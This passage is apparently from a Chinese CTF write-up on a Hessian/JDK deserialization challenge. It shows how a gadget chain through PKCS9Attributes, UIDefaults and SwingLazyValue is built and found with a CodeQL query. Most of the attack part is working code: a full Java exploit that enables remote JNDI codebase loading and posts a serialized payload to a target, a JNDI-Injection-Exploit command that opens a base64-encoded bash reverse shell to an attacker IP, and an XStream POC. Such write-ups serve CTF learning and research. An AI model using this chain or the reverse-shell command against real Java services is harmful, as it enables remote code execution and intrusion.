+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd">int</span> lastRet <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span>1<span style="color:#ff79c6">;</span> <span style="color:#6272a4">// index of last element returned; -1 if no such
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd">int</span> expectedModCount <span style="color:#ff79c6">=</span> modCount<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Itr<span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">boolean</span> <span style="color:#50fa7b">hasNext</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> cursor <span style="color:#ff79c6">!=</span> size<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>其中size属性是外部类ArrayList的。如果这里不指定外部类的话会直接报错寄掉。来看看Xstream POC的写法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;iter</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;java.util.ArrayList$Itr&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;cursor&gt;</span>0<span style="color:#ff79c6">&lt;/cursor&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;lastRet&gt;</span>-1<span style="color:#ff79c6">&lt;/lastRet&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;expectedModCount&gt;</span>1<span style="color:#ff79c6">&lt;/expectedModCount&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;outer-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;java.lang.ProcessBuilder&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;command&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;string&gt;</span>calc<span style="color:#ff79c6">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/command&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/java.lang.ProcessBuilder&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/outer-class&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/iter&gt;</span>
+</span></span></code></pre></div><p>看不懂&hellip;.555</p>
+<p>调试+google半天发现反射获取到的<code>java.util.ArrayList$Itr#hasNext</code> fields有一个<code>this$0</code>指针，把它改成另外创建的ArrayList就好了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field out<span style="color:#ff79c6">=</span>iter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;this$0&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>ArrayList a<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> ArrayList<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>a<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>processBuilder<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>setValue<span style="color:#ff79c6">(</span>iter<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;this$0&#34;</span><span style="color:#ff79c6">,</span>a<span style="color:#ff79c6">);</span>
+</span></span></code></pre></div><h3 id="序列化时候的报错">序列化时候的报错</h3>
+<p>在控制属性<code>javax.imageio.spi.FilterIterator.next</code>的时候我一开始是这样写的</p>
+<p><code>setValue(iterator,&quot;next&quot;,1);</code></p>
+<p>这样的话序列化的时候直接开香槟</p>
+<p><img src="https://s2.loli.net/2022/09/19/bUxaEpDWFYZjC1q.png" alt=""></p>
+<p>动调发现<code>iterator.next()</code>必须返回<code>Map.Entry&lt;K,V&gt;</code></p>
+<p><img src="https://s2.loli.net/2022/09/19/KJhbgzAapw6QNGi.png" alt=""></p>
+<p>key还得是<code>InputStream</code></p>
+<p><img src="https://s2.loli.net/2022/09/19/yGtxsSK1klnbfBP.png" alt=""></p>
+<p>所以改成了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>AbstractMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">SimpleEntry</span> entry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> AbstractMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">SimpleEntry</span><span style="color:#ff79c6">&lt;&gt;(</span>obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.io.ByteArrayInputStream&#34;</span><span style="color:#ff79c6">),</span> <span style="color:#f1fa8c">&#34;one&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>setValue<span style="color:#ff79c6">(</span>iterator<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;next&#34;</span><span style="color:#ff79c6">,</span>entry<span style="color:#ff79c6">);</span>
+</span></span></code></pre></div><h3 id="datasourceis被掉包">dataSource.is被掉包</h3>
+<p>把hessian的CVE拼上去</p>
+<p><a href="https://y4er.com/posts/wangdingbei-badbean-hessian2/">https://y4er.com/posts/wangdingbei-badbean-hessian2/</a></p>
+<p>结果发现反序列化的时候dataSource.is被换成了Hessian2Input$ReadInputStream</p>
+<p><img src="https://s2.loli.net/2022/09/19/HS5RgvCLtnozO2x.png" alt=""></p>
+<p>感觉基本可以确定是hessian特性，寄</p>
+<h2 id="正解">正解</h2>
+<h3 id="改造-swinglazyvalue-链">改造 SwingLazyValue 链</h3>
+<p>回过头来看看SwingLazyValue这条链，发现其实这一部分是可以用的</p>
+<pre tabindex="0"><code>UIDefaults.get
+UIDefaults.getFromHashTable
+UIDefaults$LazyValue.createValue
+SwingLazyValue.createValue
+</code></pre><p>只需要另外寻找xxx.toString -&gt; HashTable.get 就可以把链子拼完</p>
+<p>师傅们似乎都是用的自动化审计。所以这里用codeql复现一下</p>
+<p>首先使用的库是</p>
+<p><a href="https://lgtm.com/projects/g/openjdk/jdk/?mode=list">https://lgtm.com/projects/g/openjdk/jdk/?mode=list</a></p>
+<p><del>这jdk版本鬼知道是哪一个，如果需要指定版本需要自己编译一遍JDK。本来想试试的，但是配个codeql环境浪费了我一整个下午的马原课，直接劝退了呜呜呜</del></p>
+<p>然后改一下这篇文章的链子</p>
+<p><a href="https://tttang.com/archive/1511/">https://tttang.com/archive/1511/</a></p>
+<p>注意edge的定义，好像文章的作者并没有体现“上一个对象方法调用了自身属性的下一个方法”&hellip;? 稍微改一下</p>
+<pre tabindex="0"><code class="language-ql" data-lang="ql">query predicate edges(Method a, Method b) { 
+  a.polyCalls(b) 
+  and
+  a.getDeclaringType().getAField().getDeclaringType().hasName(b.getDeclaringType().getName())
+ }
+</code></pre><p>完整ql代码</p>
+<pre tabindex="0"><code class="language-ql" data-lang="ql">/**
+@kind path-problem
+*/
+
+import java
+import semmle.code.java.dataflow.FlowSources
+
+class ROMethod extends Method{
+    ROMethod(){
+        this.hasName(&#34;toString&#34;)
+    }
+}
+
+class Source extends Callable {
+    Source(){
+        (
+            this instanceof ROMethod
+        )
+    }
+}
+
+class GetMethod extends Method {
+GetMethod(){
+        this.hasName(&#34;get&#34;) and
+        this.getDeclaringType().getAnAncestor().hasQualifiedName(&#34;java.util&#34;,&#34;Hashtable&#34;)
+    }
+}
+
+class DangerousMethod extends Callable {
+    DangerousMethod(){
+        this instanceof GetMethod 
+    }
+}
+
+class CallsDangerousMethod extends Callable {
+
+    CallsDangerousMethod() {
+        exists(Callable a| this.polyCalls(a) and 
+        a instanceof DangerousMethod )
+    }  
+}  
+
+
+query predicate edges(Method a, Method b) { 
+    a.polyCalls(b) 
+    and
+    a.getDeclaringType().getAField().getDeclaringType().hasName(b.getDeclaringType().getName())
+}
+
+from Source source, CallsDangerousMethod sink
+where edges+(source, sink)
+select source, source, sink, &#34;$@ $@ to $@ $@&#34; ,
+source.getDeclaringType(),source.getDeclaringType().getName(),
+source,source.getName(),
+sink.getDeclaringType(),sink.getDeclaringType().getName(),
+sink,sink.getName() 
+</code></pre><p>成功跑出了这一个gadget</p>
+<p><img src="https://s2.loli.net/2022/09/20/KZBvihFt1MTGsEc.png" alt=""></p>
+<p>测试</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>SwingLazyValue value<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> SwingLazyValue<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.naming.InitialContext&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;doLookup&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;ldap://127.0.0.1:6666&#34;</span><span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>UIDefaults uiDefaults <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> UIDefaults<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>uiDefaults<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>PKCS9Attribute<span style="color:#ff79c6">.</span><span style="color:#50fa7b">CHALLENGE_PASSWORD_OID</span><span style="color:#ff79c6">,</span>value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>Object o<span style="color:#ff79c6">=</span>obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;sun.security.pkcs.PKCS9Attributes&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>setValue<span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;attributes&#34;</span><span style="color:#ff79c6">,</span>uiDefaults<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>o<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">();</span>
+</span></span></code></pre></div><p>确实运行到了这里</p>
+<p><img src="https://s2.loli.net/2022/09/20/74Ma8sHhYmcNKFA.png" alt=""></p>
+<h3 id="可控类可控方法可控参数">可控类.可控方法(可控参数)</h3>
+<p>其实到这一步才是真正的难点。还记得吗，题目ban掉的<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>是可以任意文件写的。</p>
+<p>我们要找到一个public static方法来导致RCE</p>
+<p>这里官方的write up总结了几种方法</p>
+<blockquote>
+<p>some interesting staic funtions</p>
+<p>MethodUtils.invoke
+0ctf-2022-soln-hessian-onlyjdk
+System.setProperty + InitalContext.doLookup @福来阁
+DumpBytecode.dumpBytecode + System.load @ty1310 @nese
+com.sun.org.apache.xalan.internal.xslt.Process._main @福来阁 @Water Paddler
+sun.tools.jar.Main.main
+writeup @Cyku
+System.setProperty + jdk.jfr.internal.Utils.writeGeneratedAsm @StrawHat</p>
+</blockquote>
+<p>Orz&hellip;.</p>
+<p>复现两个个人觉得用得比较通用的方法</p>
+<h4 id="systemsetproperty--initalcontextdolookup">System.setProperty + InitalContext.doLookup</h4>
+<p>典中典了，这也是文章中的方法。因为题目是高版本，如果要完成原生JDK RMI注入需要设置一下系统配置</p>
+<blockquote>
+<p>在<code>RMI</code>服务中引用远程对象将受本地Java环境限制即本地的<code>java.rmi.server.useCodebaseOnly</code>配置必须为<code>false(允许加载远程对象)</code>，如果该值为<code>true</code>则禁止引用远程对象。除此之外被引用的<code>ObjectFactory</code>对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为<code>false(不信任远程引用对象)</code>一样无法调用远程的引用对象。</p>
+<ol>
+<li><code>JDK 5U45,JDK 6U45,JDK 7u21,JDK 8u121</code>开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code>。</li>
+<li><code>JDK 6u132, JDK 7u122, JDK 8u113</code>开始<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了<code>false</code>。</li>
+</ol>
+<p>本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.rmi.server.useCodebaseOnly&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;false&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">);</span>
+</span></span></code></pre></div></blockquote>
+<p>最先尝试marshalsec搭建的服务器，结果寄了。最后还是</p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md</a></p>
+<p>打通了</p>
+<p>起一个反弹shell的服务器</p>
+<p><code>/home/www/htdocs/80/jdk1.8.0_212/bin/java -jar  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,xxxxxxxxx}|{base64,-d}|{bash,-i}&quot; -A &quot;ip&quot;</code></p>
+<p>运行POC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> test<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.caucho.hessian.io.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.reflect.ReflectionFactory<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.security.pkcs.PKCS9Attribute<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.security.pkcs.PKCS9Attributes<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.swing.SwingLazyValue<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.HttpURLConnection<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.MalformedURLException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.URL<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.activation.DataHandler<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.activation.DataSource<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.BadAttributeValueExpException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.swing.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.KeyPair<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.KeyPairGenerator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.PrivateKey<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Solve</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> String targetUrl<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://192.168.238.165:8090/&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        exec<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.lang.System&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;setProperty&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;java.rmi.server.useCodebaseOnly&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;false&#34;</span><span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>        exec<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.lang.System&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;setProperty&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>        exec<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.lang.System&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;setProperty&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>        exec<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.naming.InitialContext&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;doLookup&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;rmi://xxxx:1099/4metkg&#34;</span><span style="color:#ff79c6">});</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>String className<span style="color:#ff79c6">,</span>String methodName<span style="color:#ff79c6">,</span>Object<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        SwingLazyValue value<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> SwingLazyValue<span style="color:#ff79c6">(</span>className<span style="color:#ff79c6">,</span> methodName<span style="color:#ff79c6">,</span> args<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        UIDefaults uiDefaults <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> UIDefaults<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        uiDefaults<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>PKCS9Attribute<span style="color:#ff79c6">.</span><span style="color:#50fa7b">CHALLENGE_PASSWORD_OID</span><span style="color:#ff79c6">,</span>value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Object o<span style="color:#ff79c6">=</span>obj<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;sun.security.pkcs.PKCS9Attributes&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setValue<span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;attributes&#34;</span><span style="color:#ff79c6">,</span>uiDefaults<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        Hessian2Output hessianOutput1<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> Hessian2Output<span style="color:#ff79c6">(</span>byteArrayOutputStream<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getSerializerFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">setAllowNonSerializable</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeString</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;aaa&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        hessianOutput1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flushBuffer</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>byteArrayOutputStream<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        post<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">post</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        URL url<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> URL<span style="color:#ff79c6">(</span>targetUrl<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        HttpURLConnection con <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>HttpURLConnection<span style="color:#ff79c6">)</span> url<span style="color:#ff79c6">.</span><span style="color:#50fa7b">openConnection</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        con<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setRequestMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;POST&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        con<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setDoOutput</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span><span style="color:#ff79c6">(</span>OutputStream os <span style="color:#ff79c6">=</span> con<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            os<span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        BufferedReader in <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BufferedReader<span style="color:#ff79c6">(</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> InputStreamReader<span style="color:#ff79c6">(</span>con<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">()));</span>
+</span></span><span style="display:flex;"><span>        String inputLine<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>        StringBuffer content <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> StringBuffer<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">((</span>inputLine <span style="color:#ff79c6">=</span> in<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readLine</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            content<span style="color:#ff79c6">.</span><span style="color:#50fa7b">append</span><span style="color:#ff79c6">(</span>inputLine<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        in<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>content<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">obj</span><span style="color:#ff79c6">(</span>String s<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> ClassNotFoundException<span style="color:#ff79c6">,</span> InvocationTargetException<span style="color:#ff79c6">,</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> createWithoutConstructor<span style="color:#ff79c6">(</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
